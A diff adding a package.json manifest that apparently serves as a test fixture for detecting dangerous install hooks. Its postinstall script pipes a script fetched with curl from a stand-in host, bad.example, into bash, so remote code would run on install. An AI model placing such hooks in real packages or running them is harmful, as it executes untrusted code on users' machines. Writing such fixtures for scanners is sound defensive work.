@@ -1,0 +1,8 @@
+﻿{
+  "name": "manifest-curl-pipe-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://bad.example/bootstrap.sh | bash"
+  }
+}
+
